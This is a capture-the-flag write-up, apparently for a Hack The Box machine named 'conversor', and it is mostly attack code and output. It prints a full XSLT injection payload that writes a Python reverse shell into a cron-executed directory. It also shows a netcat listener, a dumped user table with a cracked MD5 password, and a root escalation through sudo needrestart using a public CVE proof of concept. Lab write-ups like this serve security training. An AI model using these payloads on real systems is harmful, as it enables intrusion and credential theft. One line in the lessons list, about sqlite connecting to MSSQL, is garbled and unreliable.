port 22,80 open
on port 80, a xml transformer is running, for some reason I cannot downolad source code on /about packages
but this application may be vuln of XSLT injeciton or XXE injection.
From the source code got by others, 	
``
xml_file.save(xml_path)
xslt_file.save(xslt_path)  
  try:
      parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
```

save the upload files, and harden xml_file, but xslt is accepte without any security check, so try xslt injeciton;
use exsl:document to write revershell to the host

inside install.md:
```
You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.


* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```
#### foothold
we should write payload to dir scripts and wait for www-data to run it. since it is dev by framwork of Pyhton, write a python revershell
```
<!-- write_pwn.xslt -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">

  <xsl:output method="text"/>

  <xsl:template match="/">
    <!-- write the Python file to the cron-run directory -->
    <exsl:document href="file:///var/www/conversor.htb/scripts/pwn.py" method="text">
      <xsl:text># payload written by XSLT&#10;</xsl:text>
      <xsl:text>import socket,os,pty&#10;</xsl:text>
      <xsl:text>s=socket.create_connection(("xxx.xx.xx.xx",$port))&#10;</xsl:text>
      <xsl:text>for fd in (0,1,2): os.dup2(s.fileno(),fd)&#10;</xsl:text>
      <xsl:text>pty.spawn("/bin/bash")&#10;</xsl:text>
    </exsl:document>

    <!-- optional: emit something so transform succeeds -->
    <xsl:text>ok</xsl:text>
  </xsl:template>
</xsl:stylesheet>
```


`└─$ nc -nvlp 8821`
```
listening on [any] 8821 ...
connect to [10.10.16.194] from (UNKNOWN) [10.129.10.149] 51236
www-data@conversor:~$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`www-data@conversor:~/conversor.htb/instance$ cat users.db`
cat users.db
```
>  �7����0�?tablefilesfilesCREATE TABLE files (
          id TEXT PRIMARY KEY,
          user_id INTEGER,
          filename TEXT,
          FOREIGN KEY(user_id) REFERENCES users(id)
      ))=indexsqlite_autoindex_files_1filesP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��tableusersusersCREATE TABLE users (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT UNIQUE,
          password TEXT
  ��zzV.!Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
  ����    usersthack
  X�\
  R	U_269d9e07-ffda-460c-90fe-3619990c6e41269d9e07-ffda-460c-90fe-3619990c6e41.htmlU_1363be8b-c6c8-4227-92cc-1367b434fb141363be8b-c6c8-4227-92cc-1367b434fb14.htmlRU_c3f1ec9b-1b2c-49d2-96a6-33aff7028391c3f1ec9b-1b2c-49d2-96a6-33aff7028391.htmlRU_f06dc183-e13f-4f4c-8389-7e414d7fe573f06dc183-e13f-4f4c-8389-7e414d7fe573.htmlRU_0facc6c2-7625-4240-9dd0-d1085335224c0facc6c2-7625-4240-9dd0-d1085335224c.htmlRU_00508ffa-82dd-4c42-9867-7dd4a6b1660500508ffa-82dd-4c42-9867-7dd4a6b16605.htmlRU_89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b.htmlRU_a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2.htmlRU_8374be69-0931-4445-8f58-5589d27ec7d78374be69-0931-4445-8f58-5589d27ec7d7.html
  	�]4������
                   (U269d9e07-ffda-460c-90fe-3619990c6e41	(U1363be8b-c6c8-4227-92cc-1367b434fb1(Uc3f1ec9b-1b2c-49d2-96a6-33aff7028391(Uf06dc183-e13f-4f4c-8389-7e414d7fe573(U0facc6c2-7625-4240-9dd0-d1085335224c(U00508ffa-82dd-4c42-9867-7dd4a6b16605(U89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b(Ua10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2'U	8374be69-0931-4445-8f58-5589d27ec7d7www-data@conversor:~/conversor.htb/instance
> ```
`www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db`
```
sqlite3 users.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
.tables
files  users
sqlite> select * from users;
select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec

5b5c3ac3a1c897c94caad48e6c71fdec	md5	Keepmesafeandwarm
```

fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)

#### privi escalate
`fismathack@conversor:~$ sudo -l`
```
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

`fismathack@conversor:~$ cat /etc/os*`
```
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
https://github.com/makuga01/CVE-2024-48990-PoC/tree/main

`fismathack@conversor:/tmp$ PYTHONPATH="$PWD" python3 e.py`
```
Error processing line 1 of /usr/lib/python3/dist-packages/zope.interface-5.4.0-nspkg.pth:

  Traceback (most recent call last):
    File "/usr/lib/python3.10/site.py", line 192, in addpackage
      exec(line)
    File "<string>", line 1, in <module>
  ImportError: dynamic module does not define module export function (PyInit_importlib)

Remainder of file ignored
##########################################

Don't mind the error message above

Waiting for needrestart to run...
Got the shell!
```

# id
uid=1000(fismathack) gid=1000(fismathack) euid=0(root) groups=1000(fismathack)

#### lesson learned
- XSLT injection and XXE injection
- sqlite to connect MSSQL db
